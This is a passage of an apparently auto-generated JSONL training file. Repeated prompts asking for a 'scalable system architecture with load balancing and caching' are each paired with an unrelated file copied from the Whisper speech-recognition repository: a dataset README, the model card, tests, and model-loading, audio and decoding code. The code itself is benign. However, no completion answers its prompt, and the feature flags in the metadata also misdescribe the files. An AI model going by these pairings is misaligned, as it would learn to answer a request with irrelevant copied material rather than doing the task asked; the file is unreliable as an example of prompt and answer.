Multilingual LibriSpeech\n\nWe used the test splits from each language in [the Multilingual LibriSpeech (MLS) corpus](https://www.openslr.org/94/).\n\n### Fleurs\n\nWe collected audio files and transcripts using the implementation available as [HuggingFace datasets](https://huggingface.co/datasets/google/fleurs/blob/main/fleurs.py). To use as a translation dataset, we matched the numerical utterance IDs to find the corresponding transcript in English.   \n\n### VoxPopuli\n\nWe used the `get_asr_data.py` script from [the official repository](https://github.com/facebookresearch/voxpopuli) to collect the ASR data in 14 languages. \n\n### Common Voice 9\n\nWe downloaded the Common Voice Corpus 9 from [the official website](https://commonvoice.mozilla.org/en/datasets)\n\n### CoVOST 2\n\nWe collected the `X into English` data collected using [the official repository](https://github.com/facebookresearch/covost).\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "data/README.md", "language": "markdown", "complexity": "medium", "star_count": 85533, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 119}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Model Card: Whisper\n\nThis is the official codebase for running the automatic speech recognition (ASR) models (Whisper models) trained and released by OpenAI.\n\nFollowing [Model Cards for Model Reporting (Mitchell et al.)](https://arxiv.org/abs/1810.03993), we're providing some information about the automatic speech recognition model. More information on how these models were trained and evaluated can be found [in the paper](https://arxiv.org/abs/2212.04356).\n\n\n## Model Details\n\nThe Whisper models are trained for speech recognition and translation tasks, capable of transcribing speech audio into the text in the language it is spoken (ASR) as well as translated into English (speech translation). Researchers at OpenAI developed the models to study the robustness of speech processing systems trained under large-scale weak supervision. There are 9 models of different sizes and capabilities, summarized in the following table.\n\n|  Size  | Parameters | English-only model | Multilingual model |  \n|:------:|:----------:|:------------------:|:------------------:|\n|  tiny  |    39 M    |         ✓          |         ✓          |\n|  base  |    74 M    |         ✓          |         ✓          |\n| small  |   244 M    |         ✓          |         ✓          |\n| medium |   769 M    |         ✓          |         ✓          |\n| large  |   1550 M   |                    |         ✓          |\n| turbo  |   798 M    |                    |         ✓          |\n\nIn December 2022, we [released an improved large model named `large-v2`](https://github.com/openai/whisper/discussions/661), and `large-v3` in November 2023.\nAdditionally, we've added a `turbo` model in September 2024 which is optimized for inference speed.\n\n\n### Release date\n\nSeptember 2022 (original series), December 2022 (`large-v2`), November 2023 (`large-v3`), September 2024 (`large-v3-turbo`)\n\n### Model type\n\nSequence-to-sequence ASR (automatic speech recognition) and speech translation model\n\n### Paper & samples\n\n[Paper](https://arxiv.org/abs/2212.04356) / [Blog](https://openai.com/blog/whisper)\n\n\n## Model Use\n\n### Evaluated Use\n\nThe primary intended users of these models are AI researchers studying the robustness, generalization, capabilities, biases, and constraints of the current model. However, Whisper is also potentially quite useful as an ASR solution for developers, especially for English speech recognition. We recognize that once models are released, it is impossible to restrict access to only “intended” uses or to draw reasonable guidelines around what is or is not research.\n\nThe models are primarily trained and evaluated on ASR and speech translation to English tasks. They show strong ASR results in ~10 languages. They may exhibit additional capabilities, particularly if fine-tuned on certain tasks like voice activity detection, speaker classification, or speaker diarization but have not been robustly evaluated in these areas. We strongly recommend that users perform robust evaluations of the models in a particular context and domain before deploying them.\n\nIn particular, we caution against using Whisper models to transcribe recordings of individuals taken without their consent or purporting to use these models for any kind of subjective classification. We recommend against use in high-risk domains like decision-making contexts, where flaws in accuracy can lead to pronounced flaws in outcomes. The models are intended to transcribe and translate speech, use of the model for classification is not only not evaluated but also not appropriate, particularly to infer human attributes.\n\n\n## Training Data\n\nThe models are trained on 680,000 hours of audio and the corresponding transcripts collected from the internet. 65% of this data (or 438,000 hours) represents English-language audio and matched English transcripts, roughly 18% (or 126,000 hours) represents non-English audio and English transcripts, while the final 17% (or 117,000 hours) represents non-English audio and the corresponding transcript. This non-English data represents 98 different languages. \n\nAs discussed in [the accompanying paper](https://arxiv.org/abs/2212.04356), we see that performance on transcription in a given language is directly correlated with the amount of training data we employ in that language.\n\n\n## Performance and Limitations\n\nOur studies show that, over many existing ASR systems, the models exhibit improved robustness to accents, background noise, and technical language, as well as zero-shot translation from multiple languages into English; and that accuracy on speech recognition and translation is near the state-of-the-art level. \n\nHowever, because the models are trained in a weakly supervised manner using large-scale noisy data, the predictions may include texts that are not actually spoken in the audio input (i.e. hallucination). We hypothesize that this happens because, given their general knowledge of language, the models combine trying to predict the next word in audio with trying to transcribe the audio itself.\n\nOur models perform unevenly across languages, and we observe lower accuracy on low-resource and/or low-discoverability languages or languages where we have less training data. The models also exhibit disparate performance on different accents and dialects of particular languages, which may include a higher word error rate across speakers of different genders, races, ages, or other demographic criteria. Our full evaluation results are presented in [the paper accompanying this release](https://arxiv.org/abs/2212.04356).\n\nIn addition, the sequence-to-sequence architecture of the model makes it prone to generating repetitive texts, which can be mitigated to some degree by beam search and temperature scheduling but not perfectly. Further analysis of these limitations is provided in [the paper](https://arxiv.org/abs/2212.04356). It is likely that this behavior and hallucinations may be worse in lower-resource and/or lower-discoverability languages.\n\n\n## Broader Implications\n\nWe anticipate that Whisper models’ transcription capabilities may be used for improving accessibility tools. While Whisper models cannot be used for real-time transcription out of the box – their speed and size suggest that others may be able to build applications on top of them that allow for near-real-time speech recognition and translation. The real value of beneficial applications built on top of Whisper models suggests that the disparate performance of these models may have real economic implications.\n\nThere are also potential dual-use concerns that come with releasing Whisper. While we hope the technology will be used primarily for beneficial purposes, making ASR technology more accessible could enable more actors to build capable surveillance technologies or scale up existing surveillance efforts, as the speed and accuracy allow for affordable automatic transcription and translation of large volumes of audio communication. Moreover, these models may have some capabilities to recognize specific individuals out of the box, which in turn presents safety concerns related both to dual use and disparate performance. In practice, we expect that the cost of transcription is not the limiting factor of scaling up surveillance projects.\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "model-card.md", "language": "markdown", "complexity": "simple", "star_count": 85533, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 72}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os.path\n\nimport numpy as np\n\nfrom whisper.audio import SAMPLE_RATE, load_audio, log_mel_spectrogram\n\n\ndef test_audio():\n    audio_path = os.path.join(os.path.dirname(__file__), \"jfk.flac\")\n    audio = load_audio(audio_path)\n    assert audio.ndim == 1\n    assert SAMPLE_RATE * 10 < audio.shape[0] < SAMPLE_RATE * 12\n    assert 0 < audio.std() < 1\n\n    mel_from_audio = log_mel_spectrogram(audio)\n    mel_from_file = log_mel_spectrogram(audio_path)\n\n    assert np.allclose(mel_from_audio, mel_from_file)\n    assert mel_from_audio.max() - mel_from_audio.min() <= 2.0\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "tests/test_audio.py", "language": "python", "complexity": "simple", "star_count": 85533, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 20}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\n\nimport pytest\nimport torch\n\nimport whisper\nfrom whisper.tokenizer import get_tokenizer\n\n\n@pytest.mark.parametrize(\"model_name\", whisper.available_models())\ndef test_transcribe(model_name: str):\n    device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n    model = whisper.load_model(model_name).to(device)\n    audio_path = os.path.join(os.path.dirname(__file__), \"jfk.flac\")\n\n    language = \"en\" if model_name.endswith(\".en\") else None\n    result = model.transcribe(\n        audio_path, language=language, temperature=0.0, word_timestamps=True\n    )\n    assert result[\"language\"] == \"en\"\n    assert result[\"text\"] == \"\".join([s[\"text\"] for s in result[\"segments\"]])\n\n    transcription = result[\"text\"].lower()\n    assert \"my fellow americans\" in transcription\n    assert \"your country\" in transcription\n    assert \"do for you\" in transcription\n\n    tokenizer = get_tokenizer(model.is_multilingual, num_languages=model.num_languages)\n    all_tokens = [t for s in result[\"segments\"] for t in s[\"tokens\"]]\n    assert tokenizer.decode(all_tokens) == result[\"text\"]\n    assert tokenizer.decode_with_timestamps(all_tokens).startswith(\"<|0.00|>\")\n\n    timing_checked = False\n    for segment in result[\"segments\"]:\n        for timing in segment[\"words\"]:\n            assert timing[\"start\"] < timing[\"end\"]\n            if timing[\"word\"].strip(\" ,\") == \"Americans\":\n                assert timing[\"start\"] <= 1.8\n                assert timing[\"end\"] >= 1.8\n                timing_checked = True\n\n    assert timing_checked\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "tests/test_transcribe.py", "language": "python", "complexity": "simple", "star_count": 85533, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 43}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import hashlib\nimport io\nimport os\nimport urllib\nimport warnings\nfrom typing import List, Optional, Union\n\nimport torch\nfrom tqdm import tqdm\n\nfrom .audio import load_audio, log_mel_spectrogram, pad_or_trim\nfrom .decoding import DecodingOptions, DecodingResult, decode, detect_language\nfrom .model import ModelDimensions, Whisper\nfrom .transcribe import transcribe\nfrom .version import __version__\n\n_MODELS = {\n    \"tiny.en\": \"https://openaipublic.azureedge.net/main/whisper/models/d3dd57d32accea0b295c96e26691aa14d8822fac7d9d27d5dc00b4ca2826dd03/tiny.en.pt\",\n    \"tiny\": \"https://openaipublic.azureedge.net/main/whisper/models/65147644a518d12f04e32d6f3b26facc3f8dd46e5390956a9424a650c0ce22b9/tiny.pt\",\n    \"base.en\": \"https://openaipublic.azureedge.net/main/whisper/models/25a8566e1d0c1e2231d1c762132cd20e0f96a85d16145c3a00adf5d1ac670ead/base.en.pt\",\n    \"base\": \"https://openaipublic.azureedge.net/main/whisper/models/ed3a0b6b1c0edf879ad9b11b1af5a0e6ab5db9205f891f668f8b0e6c6326e34e/base.pt\",\n    \"small.en\": \"https://openaipublic.azureedge.net/main/whisper/models/f953ad0fd29cacd07d5a9eda5624af0f6bcf2258be67c92b79389873d91e0872/small.en.pt\",\n    \"small\": \"https://openaipublic.azureedge.net/main/whisper/models/9ecf779972d90ba49c06d968637d720dd632c55bbf19d441fb42bf17a411e794/small.pt\",\n    \"medium.en\": \"https://openaipublic.azureedge.net/main/whisper/models/d7440d1dc186f76616474e0ff0b3b6b879abc9d1a4926b7adfa41db2d497ab4f/medium.en.pt\",\n    \"medium\": \"https://openaipublic.azureedge.net/main/whisper/models/345ae4da62f9b3d59415adc60127b97c714f32e89e936602e85993674d08dcb1/medium.pt\",\n    \"large-v1\": \"https://openaipublic.azureedge.net/main/whisper/models/e4b87e7e0bf463eb8e6956e646f1e277e901512310def2c24bf0e11bd3c28e9a/large-v1.pt\",\n    \"large-v2\": \"https://openaipublic.azureedge.net/main/whisper/models/81f7c96c852ee8fc832187b0132e569d6c3065a3252ed18e56effd0b6a73e524/large-v2.pt\",\n    \"large-v3\": \"https://openaipublic.azureedge.net/main/whisper/models/e5b1a55b89c1367dacf97e3e19bfd829a01529dbfdeefa8caeb59b3f1b81dadb/large-v3.pt\",\n    \"large\": \"https://openaipublic.azureedge.net/main/whisper/models/e5b1a55b89c1367dacf97e3e19bfd829a01529dbfdeefa8caeb59b3f1b81dadb/large-v3.pt\",\n    \"large-v3-turbo\": \"https://openaipublic.azureedge.net/main/whisper/models/aff26ae408abcba5fbf8813c21e62b0941638c5f6eebfb145be0c9839262a19a/large-v3-turbo.pt\",\n    \"turbo\": \"https://openaipublic.azureedge.net/main/whisper/models/aff26ae408abcba5fbf8813c21e62b0941638c5f6eebfb145be0c9839262a19a/large-v3-turbo.pt\",\n}\n\n# base85-encoded (n_layers, n_heads) boolean arrays indicating the cross-attention heads that are\n# highly correlated to the word-level timing, i.e. the alignment between audio and text tokens.\n_ALIGNMENT_HEADS = {\n    \"tiny.en\": b\"ABzY8J1N>@0{>%R00Bk>$p{7v037`oCl~+#00\",\n    \"tiny\": b\"ABzY8bu8Lr0{>%RKn9Fp%m@SkK7Kt=7ytkO\",\n    \"base.en\": b\"ABzY8;40c<0{>%RzzG;p*o+Vo09|#PsxSZm00\",\n    \"base\": b\"ABzY8KQ!870{>%RzyTQH3`Q^yNP!>##QT-<FaQ7m\",\n    \"small.en\": b\"ABzY8>?_)10{>%RpeA61k&I|OI3I$65C{;;pbCHh0B{qLQ;+}v00\",\n    \"small\": b\"ABzY8DmU6=0{>%Rpa?J`kvJ6qF(V^F86#Xh7JUGMK}P<N0000\",\n    \"medium.en\": b\"ABzY8usPae0{>%R7<zz_OvQ{)4kMa0BMw6u5rT}kRKX;$NfYBv00*Hl@qhsU00\",\n    \"medium\": b\"ABzY8B0Jh+0{>%R7}kK1fFL7w6%<-Pf*t^=N)Qr&0RR9\",\n    \"large-v1\": b\"ABzY8r9j$a0{>%R7#4sLmoOs{s)o3~84-RPdcFk!JR<kSfC2yj\",\n    \"large-v2\": b\"ABzY8zd+h!0{>%R7=D0pU<_bnWW*tkYAhobTNnu$jnkEkXqp)j;w1Tzk)UH3X%SZd&fFZ2fC2yj\",\n    \"large-v3\": b\"ABzY8gWO1E0{>%R7(9S+Kn!D~%ngiGaR?*L!iJG9p-nab0JQ=-{D1-g00\",\n    \"large\": b\"ABzY8gWO1E0{>%R7(9S+Kn!D~%ngiGaR?*L!iJG9p-nab0JQ=-{D1-g00\",\n    \"large-v3-turbo\": b\"ABzY8j^C+e0{>%RARaKHP%t(lGR*)0g!tONPyhe`\",\n    \"turbo\": b\"ABzY8j^C+e0{>%RARaKHP%t(lGR*)0g!tONPyhe`\",\n}\n\n\ndef _download(url: str, root: str, in_memory: bool) -> Union[bytes, str]:\n    os.makedirs(root, exist_ok=True)\n\n    expected_sha256 = url.split(\"/\")[-2]\n    download_target = os.path.join(root, os.path.basename(url))\n\n    if os.path.exists(download_target) and not os.path.isfile(download_target):\n        raise RuntimeError(f\"{download_target} exists and is not a regular file\")\n\n    if os.path.isfile(download_target):\n        with open(download_target, \"rb\") as f:\n            model_bytes = f.read()\n        if hashlib.sha256(model_bytes).hexdigest() == expected_sha256:\n            return model_bytes if in_memory else download_target\n        else:\n            warnings.warn(\n                f\"{download_target} exists, but the SHA256 checksum does not match; re-downloading the file\"\n            )\n\n    with urllib.request.urlopen(url) as source, open(download_target, \"wb\") as output:\n        with tqdm(\n            total=int(source.info().get(\"Content-Length\")),\n            ncols=80,\n            unit=\"iB\",\n            unit_scale=True,\n            unit_divisor=1024,\n        ) as loop:\n            while True:\n                buffer = source.read(8192)\n                if not buffer:\n                    break\n\n                output.write(buffer)\n                loop.update(len(buffer))\n\n    model_bytes = open(download_target, \"rb\").read()\n    if hashlib.sha256(model_bytes).hexdigest() != expected_sha256:\n        raise RuntimeError(\n            \"Model has been downloaded but the SHA256 checksum does not not match. Please retry loading the model.\"\n        )\n\n    return model_bytes if in_memory else download_target\n\n\ndef available_models() -> List[str]:\n    \"\"\"Returns the names of available models\"\"\"\n    return list(_MODELS.keys())\n\n\ndef load_model(\n    name: str,\n    device: Optional[Union[str, torch.device]] = None,\n    download_root: str = None,\n    in_memory: bool = False,\n) -> Whisper:\n    \"\"\"\n    Load a Whisper ASR model\n\n    Parameters\n    ----------\n    name : str\n        one of the official model names listed by `whisper.available_models()`, or\n        path to a model checkpoint containing the model dimensions and the model state_dict.\n    device : Union[str, torch.device]\n        the PyTorch device to put the model into\n    download_root: str\n        path to download the model files; by default, it uses \"~/.cache/whisper\"\n    in_memory: bool\n        whether to preload the model weights into host memory\n\n    Returns\n    -------\n    model : Whisper\n        The Whisper ASR model instance\n    \"\"\"\n\n    if device is None:\n        device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n    if download_root is None:\n        default = os.path.join(os.path.expanduser(\"~\"), \".cache\")\n        download_root = os.path.join(os.getenv(\"XDG_CACHE_HOME\", default), \"whisper\")\n\n    if name in _MODELS:\n        checkpoint_file = _download(_MODELS[name], download_root, in_memory)\n        alignment_heads = _ALIGNMENT_HEADS[name]\n    elif os.path.isfile(name):\n        checkpoint_file = open(name, \"rb\").read() if in_memory else name\n        alignment_heads = None\n    else:\n        raise RuntimeError(\n            f\"Model {name} not found; available models = {available_models()}\"\n        )\n\n    with (\n        io.BytesIO(checkpoint_file) if in_memory else open(checkpoint_file, \"rb\")\n    ) as fp:\n        kwargs = {\"weights_only\": True} if torch.__version__ >= \"1.13\" else {}\n        checkpoint = torch.load(fp, map_location=device, **kwargs)\n    del checkpoint_file\n\n    dims = ModelDimensions(**checkpoint[\"dims\"])\n    model = Whisper(dims)\n    model.load_state_dict(checkpoint[\"model_state_dict\"])\n\n    if alignment_heads is not None:\n        model.set_alignment_heads(alignment_heads)\n\n    return model.to(device)\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "whisper/__init__.py", "language": "python", "complexity": "medium", "star_count": 85533, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 162}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\nfrom functools import lru_cache\nfrom subprocess import CalledProcessError, run\nfrom typing import Optional, Union\n\nimport numpy as np\nimport torch\nimport torch.nn.functional as F\n\nfrom .utils import exact_div\n\n# hard-coded audio hyperparameters\nSAMPLE_RATE = 16000\nN_FFT = 400\nHOP_LENGTH = 160\nCHUNK_LENGTH = 30\nN_SAMPLES = CHUNK_LENGTH * SAMPLE_RATE  # 480000 samples in a 30-second chunk\nN_FRAMES = exact_div(N_SAMPLES, HOP_LENGTH)  # 3000 frames in a mel spectrogram input\n\nN_SAMPLES_PER_TOKEN = HOP_LENGTH * 2  # the initial convolutions has stride 2\nFRAMES_PER_SECOND = exact_div(SAMPLE_RATE, HOP_LENGTH)  # 10ms per audio frame\nTOKENS_PER_SECOND = exact_div(SAMPLE_RATE, N_SAMPLES_PER_TOKEN)  # 20ms per audio token\n\n\ndef load_audio(file: str, sr: int = SAMPLE_RATE):\n    \"\"\"\n    Open an audio file and read as mono waveform, resampling as necessary\n\n    Parameters\n    ----------\n    file: str\n        The audio file to open\n\n    sr: int\n        The sample rate to resample the audio if necessary\n\n    Returns\n    -------\n    A NumPy array containing the audio waveform, in float32 dtype.\n    \"\"\"\n\n    # This launches a subprocess to decode audio while down-mixing\n    # and resampling as necessary.  Requires the ffmpeg CLI in PATH.\n    # fmt: off\n    cmd = [\n        \"ffmpeg\",\n        \"-nostdin\",\n        \"-threads\", \"0\",\n        \"-i\", file,\n        \"-f\", \"s16le\",\n        \"-ac\", \"1\",\n        \"-acodec\", \"pcm_s16le\",\n        \"-ar\", str(sr),\n        \"-\"\n    ]\n    # fmt: on\n    try:\n        out = run(cmd, capture_output=True, check=True).stdout\n    except CalledProcessError as e:\n        raise RuntimeError(f\"Failed to load audio: {e.stderr.decode()}\") from e\n\n    return np.frombuffer(out, np.int16).flatten().astype(np.float32) / 32768.0\n\n\ndef pad_or_trim(array, length: int = N_SAMPLES, *, axis: int = -1):\n    \"\"\"\n    Pad or trim the audio array to N_SAMPLES, as expected by the encoder.\n    \"\"\"\n    if torch.is_tensor(array):\n        if array.shape[axis] > length:\n            array = array.index_select(\n                dim=axis, index=torch.arange(length, device=array.device)\n            )\n\n        if array.shape[axis] < length:\n            pad_widths = [(0, 0)] * array.ndim\n            pad_widths[axis] = (0, length - array.shape[axis])\n            array = F.pad(array, [pad for sizes in pad_widths[::-1] for pad in sizes])\n    else:\n        if array.shape[axis] > length:\n            array = array.take(indices=range(length), axis=axis)\n\n        if array.shape[axis] < length:\n            pad_widths = [(0, 0)] * array.ndim\n            pad_widths[axis] = (0, length - array.shape[axis])\n            array = np.pad(array, pad_widths)\n\n    return array\n\n\n@lru_cache(maxsize=None)\ndef mel_filters(device, n_mels: int) -> torch.Tensor:\n    \"\"\"\n    load the mel filterbank matrix for projecting STFT into a Mel spectrogram.\n    Allows decoupling librosa dependency; saved using:\n\n        np.savez_compressed(\n            \"mel_filters.npz\",\n            mel_80=librosa.filters.mel(sr=16000, n_fft=400, n_mels=80),\n            mel_128=librosa.filters.mel(sr=16000, n_fft=400, n_mels=128),\n        )\n    \"\"\"\n    assert n_mels in {80, 128}, f\"Unsupported n_mels: {n_mels}\"\n\n    filters_path = os.path.join(os.path.dirname(__file__), \"assets\", \"mel_filters.npz\")\n    with np.load(filters_path, allow_pickle=False) as f:\n        return torch.from_numpy(f[f\"mel_{n_mels}\"]).to(device)\n\n\ndef log_mel_spectrogram(\n    audio: Union[str, np.ndarray, torch.Tensor],\n    n_mels: int = 80,\n    padding: int = 0,\n    device: Optional[Union[str, torch.device]] = None,\n):\n    \"\"\"\n    Compute the log-Mel spectrogram of\n\n    Parameters\n    ----------\n    audio: Union[str, np.ndarray, torch.Tensor], shape = (*)\n        The path to audio or either a NumPy array or Tensor containing the audio waveform in 16 kHz\n\n    n_mels: int\n        The number of Mel-frequency filters, only 80 and 128 are supported\n\n    padding: int\n        Number of zero samples to pad to the right\n\n    device: Optional[Union[str, torch.device]]\n        If given, the audio tensor is moved to this device before STFT\n\n    Returns\n    -------\n    torch.Tensor, shape = (n_mels, n_frames)\n        A Tensor that contains the Mel spectrogram\n    \"\"\"\n    if not torch.is_tensor(audio):\n        if isinstance(audio, str):\n            audio = load_audio(audio)\n        audio = torch.from_numpy(audio)\n\n    if device is not None:\n        audio = audio.to(device)\n    if padding > 0:\n        audio = F.pad(audio, (0, padding))\n    window = torch.hann_window(N_FFT).to(audio.device)\n    stft = torch.stft(audio, N_FFT, HOP_LENGTH, window=window, return_complex=True)\n    magnitudes = stft[..., :-1].abs() ** 2\n\n    filters = mel_filters(audio.device, n_mels)\n    mel_spec = filters @ magnitudes\n\n    log_spec = torch.clamp(mel_spec, min=1e-10).log10()\n    log_spec = torch.maximum(log_spec, log_spec.max() - 8.0)\n    log_spec = (log_spec + 4.0) / 4.0\n    return log_spec\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "whisper/audio.py", "language": "python", "complexity": "medium", "star_count": 85533, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 158}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from dataclasses import dataclass, field, replace\nfrom typing import TYPE_CHECKING, Dict, Iterable, List, Optional, Sequence, Tuple, Union\n\nimport numpy as np\nimport torch\nimport torch.nn.functional as F\nfrom torch import Tensor\nfrom torch.distributions import Categorical\n\nfrom .audio import CHUNK_LENGTH\nfrom .tokenizer import Tokenizer, get_tokenizer\nfrom .utils import compression_ratio\n\nif TYPE_CHECKING:\n    from .model import Whisper\n\n\n@torch.no_grad()\ndef detect_language(\n    model: \"Whisper\", mel: Tensor, tokenizer: Tokenizer = None\n) -> Tuple[Tensor, List[dict]]:\n    \"\"\"\n    Detect the spoken language in the audio, and return them as list of strings, along with the ids\n    of the most probable language tokens and the probability distribution over all language tokens.\n    This is performed outside the main decode loop in order to not interfere with kv-caching.\n\n    Returns\n    -------\n    language_tokens : Tensor, shape = (n_audio,)\n        ids of the most probable language tokens, which appears after the startoftranscript token.\n    language_probs : List[Dict[str, float]], length = n_audio\n        list of dictionaries containing the probability distribution over all languages.\n    \"\"\"\n    if tokenizer is None:\n        tokenizer = get_tokenizer(\n            model.is_multilingual, num_languages=model.num_languages\n        )\n    if (\n        tokenizer.language is None\n        or tokenizer.language_token not in tokenizer.sot_sequence\n    ):\n        raise ValueError(\n            \"This model doesn't have language tokens so it can't perform lang id\"\n        )\n\n    single = mel.ndim == 2\n    if single:\n        mel = mel.unsqueeze(0)\n\n    # skip encoder forward pass if already-encoded audio features were given\n    if mel.shape[-2:] != (model.dims.n_audio_ctx, model.dims.n_audio_state):\n        mel = model.encoder(mel)\n\n    # forward pass using a single token, startoftranscript\n    n_audio = mel.shape[0]\n    x = torch.tensor([[tokenizer.sot]] * n_audio).to(mel.device)  # [n_audio, 1]\n    logits = model.logits(x, mel)[:, 0]\n\n    # collect detected languages; suppress all non-language tokens\n    mask = torch.ones(logits.shape[-1], dtype=torch.bool)\n    mask[list(tokenizer.all_language_tokens)] = False\n    logits[:, mask] = -np.inf\n    language_tokens = logits.argmax(dim=-1)\n    language_token_probs = logits.softmax(dim=-1).cpu()\n    language_probs = [\n        {\n            c: language_token_probs[i, j].item()\n            for j, c in zip(tokenizer.all_language_tokens, tokenizer.all_language_codes)\n        }\n        for i in range(n_audio)\n    ]\n\n    if single:\n        language_tokens = language_tokens[0]\n        language_probs = language_probs[0]\n\n    return language_tokens, language_probs\n\n\n@dataclass(frozen=True)\nclass DecodingOptions:\n    # whether to perform X->X \"transcribe\" or X->English \"translate\"\n    task: str = \"transcribe\"\n\n    # language that the audio is in; uses detected language if None\n    language: Optional[str] = None\n\n    # sampling-related options\n    temperature: float = 0.0\n    sample_len: Optional[int] = None  # maximum number of tokens to sample\n    best_of: Optional[int] = None  # number of independent sample trajectories, if t > 0\n    beam_size: Optional[int] = None  # number of beams in beam search, if t == 0\n    patience: Optional[float] = None  # patience in beam search (arxiv:2204.05424)\n\n    # \"alpha\" in Google NMT, or None for length norm, when ranking generations\n    # to select which to return among the beams or best-of-N samples\n    length_penalty: Optional[float] = None\n\n    # text or tokens to feed as the prompt or the prefix; for more info:\n    # https://github.com/openai/whisper/discussions/117#discussioncomment-3727051\n    prompt: Optional[Union[str, List[int]]] = None  # for the previous context\n    prefix: Optional[Union[str, List[int]]] = None  # to prefix the current context\n\n    # list of tokens ids (or comma-separated token ids) to suppress\n    # \"-1\" will suppress a set of symbols as defined in `tokenizer.non_speech_tokens()`\n    suppress_tokens: Optional[Union[str, Iterable[int]]] = \"-1\"\n    suppress_blank: bool = True  # this will suppress blank outputs\n\n    # timestamp sampling options\n    without_timestamps: bool = False  # use <|notimestamps|> to sample text tokens only\n    max_initial_timestamp: Optional[float] = 1.0\n\n    # implementation details\n    fp16: bool = True  # use fp16 for most of the calculation\n\n\n@dataclass(frozen=True)\nclass DecodingResult:\n    audio_features: Tensor\n    language: str\n    language_probs: Optional[Dict[str, float]] = None\n    tokens: List[int] = field(default_factory=list)\n    text: str = \"\"\n    avg_logprob: float = np.nan\n    no_speech_prob: float = np.nan\n    temperature: float = np.nan\n    compression_ratio: float = np.nan\n\n\nclass Inference:\n    def logits(self, tokens: Tensor, audio_features: Tensor) -> Tensor:\n        \"\"\"Perform a forward pass on the decoder and return per-token logits\"\"\"\n        raise NotImplementedError\n\n    def rearrange_kv_cache(self, source_indices) -> None:\n        \"\"\"Update the key-value cache according to the updated beams\"\"\"\n        raise NotImplementedError\n\n    def cleanup_caching(self) -> None:\n        \"\"\"Clean up any resources or hooks after decoding is finished\"\"\"\n        pass\n\n\nclass PyTorchInference(Inference):\n    def __init__(self, model: \"Whisper\", initial_token_length: int):\n        self.model: \"Whisper\" = model\n        self.initial_token_length = initial_token_length\n        self.kv_cache = {}\n        self.hooks = []\n\n        key_modules = [block.attn.key for block in self.model.decoder.blocks]\n        value_modules = [block.attn.value for block in self.model.decoder.blocks]\n        self.kv_modules = key_modules + value_modules\n\n    def logits(self, tokens: Tensor, audio_features: Tensor) -> Tensor:\n        if not self.kv_cache:\n            self.kv_cache, self.hooks = self.model.install_kv_cache_hooks()\n\n        if tokens.shape[-1] > self.initial_token_length:\n            # only need to use the last token except in the first forward pass\n            tokens = tokens[:, -1:]\n\n        return self.model.decoder(tokens, audio_features, kv_cache=self.kv_cache)\n\n    def cleanup_caching(self):\n        for hook in self.hooks:\n            